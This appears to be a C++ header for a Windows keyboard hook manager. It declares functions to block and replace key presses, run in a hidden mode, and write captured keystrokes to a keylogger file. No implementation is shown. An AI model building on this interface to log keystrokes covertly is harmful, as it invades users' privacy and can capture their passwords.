#if !defined(HOOK_MANAGER)
    #define HOOK_MANAGER
    #include <Windows.h>
    #include <vector>
#endif

using namespace std;

#define BUTTON_WAS_BLOCKED 11
#define TARGET_BUTTON_ACCEPTED 12
#define BUTTON_TO_REPLACE_ACCEPTED 13
#define HOOK_MANAGER_ERROR_MESSAGE 14
#define EMPTY_MESSAGE 15

#define NORMAL_MODE 111
#define HIDDEN_MODE 222

void InitializeWindowsHooks();
void Run(int mode);
void PressingWait(int sec);
void SetMessageHandler(void(*handler)(int));
void SetStopCode(int code);
void AddKeyLoggerFile(char* fileName);
void FreeWindowsHooksResourses();
void CloseKeyloggerFile();

void SetFlagForButtonBlocking();
void SetFlagForButtonReplacing();
void SetFlagForContinueReplacing();
